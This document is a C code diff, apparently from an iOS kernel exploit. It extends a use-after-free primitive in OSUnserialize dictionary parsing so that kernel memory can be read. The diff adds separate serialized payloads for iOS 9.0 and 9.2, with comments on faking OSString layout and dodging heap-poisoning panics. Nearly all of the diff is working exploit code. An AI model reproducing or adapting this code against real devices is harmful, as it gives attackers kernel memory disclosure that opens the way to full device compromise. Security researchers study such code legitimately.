@@ -24,44 +24,99 @@ void uaf_get_bytes(const OSString *fake, char *buf, size_t len)
     const char str[4] = "str",
                ref[4] = "ref",
                sav[4] = "sav";
-    uint32_t dict[11 + sizeof(OSString) / sizeof(uint32_t)] =
-    {
-        kOSSerializeMagic,                                              // Magic
-        kOSSerializeEndCollection | kOSSerializeDictionary | 6,         // Dictionary with 6 entries
 
-        kOSSerializeString | 4,                                         // String that will get freed
-        *((uint32_t*)str),
-        kOSSerializeData | sizeof(OSString),                            // OSData with same size as OSString
+    if(get_os_version() >= V_13C75) // 9.2
+    {
+        uint32_t dict_92[11 + sizeof(OSString) / sizeof(uint32_t)] =
+        {
+            kOSSerializeMagic,                                              // Magic
+            kOSSerializeEndCollection | kOSSerializeDictionary | 6,         // Dictionary with 6 entries
+
+            kOSSerializeString | 4,                                         // String that will get freed
+            *((uint32_t*)str),
+            kOSSerializeData | sizeof(OSString),                            // OSData with same size as OSString
 #ifdef __LP64__
-        data[0],                                                        // vtable pointer (lower half)
-        data[1],                                                        // vtable pointer (upper half)
-        data[2],                                                        // retainCount
-        data[3],                                                        // flags
-        data[4],                                                        // length
-        data[5],                                                        // (padding)
-        data[6],                                                        // string pointer (lower half)
-        data[7],                                                        // string pointer (upper half)
+            data[0],                                                        // vtable pointer (lower half)
+            data[1],                                                        // vtable pointer (upper half)
+            data[2],                                                        // retainCount
+            data[3],                                                        // flags
+            data[4],                                                        // length
+            data[5],                                                        // (padding)
+            data[6],                                                        // string pointer (lower half)
+            data[7],                                                        // string pointer (upper half)
 #else
-        data[0],                                                        // vtable pointer
-        data[1],                                                        // retainCount
-        data[2],                                                        // flags
-        data[3],                                                        // length
-        data[4],                                                        // string pointer
+            data[0],                                                        // vtable pointer
+            data[1],                                                        // retainCount
+            data[2],                                                        // flags
+            data[3],                                                        // length
+            data[4],                                                        // string pointer
 #endif
 
-        kOSSerializeSymbol | 4,                                         // Name that we're gonna use to retrieve bytes
-        *((uint32_t*)ref),
-        kOSSerializeObject | 1,                                         // Reference to the overwritten OSString
+            kOSSerializeSymbol | 4,                                         // Name that we're gonna use to retrieve bytes
+            *((uint32_t*)ref),
+            kOSSerializeObject | 1,                                         // Reference to the overwritten OSString
 
-        kOSSerializeSymbol | 4,                                         // Create a reference to the OSData to prevent it
-        *((uint32_t*)sav),                                              // from being freed before the OSString, which
-        kOSSerializeEndCollection | kOSSerializeObject | 2,             // would cause a panic (because heap poisoning).
-    };
-    PRINT_BUF("Dict", dict, sizeof(dict));
+            kOSSerializeSymbol | 4,                                         // Create a reference to the OSData to prevent it
+            *((uint32_t*)sav),                                              // from being freed before the OSString, which
+            kOSSerializeEndCollection | kOSSerializeObject | 2,             // would cause a panic (because heap poisoning).
+        };
+        PRINT_BUF("dict_92", dict_92, sizeof(dict_92));
 
-    dict_get_bytes(dict, sizeof(dict), ref, buf, &buflen);
+        usleep(10000);
 
-    PRINT_BUF("Fetched bytes", (uint32_t*)buf, buflen);
+        dict_get_bytes(dict_92, sizeof(dict_92), ref, buf, &buflen);
+    }
+    else
+    {
+        uint32_t dict_90[16 + sizeof(OSString) / sizeof(uint32_t)] =
+        {
+            kOSSerializeMagic,                                              // Magic
+            kOSSerializeEndCollection | kOSSerializeDictionary | 6,         // Dictionary with 6 entries
+
+            kOSSerializeSymbol | 4,                                         // Whatever name
+            *((uint32_t*)str),
+            kOSSerializeString | 4,                                         // String that will get freed
+            *((uint32_t*)str),
+
+            kOSSerializeObject | 1,                                         // Same name
+            kOSSerializeBoolean | 1,                                        // Lightweight value
+
+            kOSSerializeObject | 1,                                         // Same name again
+            kOSSerializeData | sizeof(OSString),                            // OSData with same size as OSString
+#ifdef __LP64__
+            data[0],                                                        // vtable pointer (lower half)
+            data[1],                                                        // vtable pointer (upper half)
+            data[2],                                                        // retainCount
+            data[3],                                                        // flags
+            data[4],                                                        // length
+            data[5],                                                        // (padding)
+            data[6],                                                        // string pointer (lower half)
+            data[7],                                                        // string pointer (upper half)
+#else
+            data[0],                                                        // vtable pointer
+            data[1],                                                        // retainCount
+            data[2],                                                        // flags
+            data[3],                                                        // length
+            data[4],                                                        // string pointer
+#endif
+
+            kOSSerializeSymbol | 4,                                         // Name that we're gonna use to retrieve bytes
+            *((uint32_t*)ref),
+            kOSSerializeObject | 2,                                         // Reference to the overwritten OSString
+
+            kOSSerializeSymbol | 4,                                         // Create a reference to the OSData to prevent it
+            *((uint32_t*)sav),                                              // from being freed before the OSString, which
+            kOSSerializeEndCollection | kOSSerializeObject | 4,             // would cause a panic (because heap poisoning).
+        };
+        PRINT_BUF("dict_90", dict_90, sizeof(dict_90));
+
+        usleep(10000);
+
+        dict_get_bytes(dict_90, sizeof(dict_90), ref, buf, &buflen);
+    }
+
+    uint32_t *ubuf = (uint32_t*)buf;
+    PRINT_BUF("Fetched bytes", ubuf, buflen);
 }
 
 void uaf_read_naive(const char *addr, char *buf, size_t len)
@@ -75,8 +130,8 @@ void uaf_read_naive(const char *addr, char *buf, size_t len)
         .flags = kOSStringNoCopy,                       // and neither the "string" it points to
     };
 
-    bool oldverbose = verbose;
-    verbose = false;
+    //bool oldverbose = verbose;
+    //verbose = false;
     for(size_t off = 0; off < len; off += osstr.length)
     {
         osstr.length = len - off;
@@ -84,7 +139,7 @@ void uaf_read_naive(const char *addr, char *buf, size_t len)
         osstr.string = &addr[off];
         uaf_get_bytes(&osstr, &buf[off], osstr.length);
     }
-    verbose = oldverbose;
+    //verbose = oldverbose;
 }
 
 #ifdef __LP64__
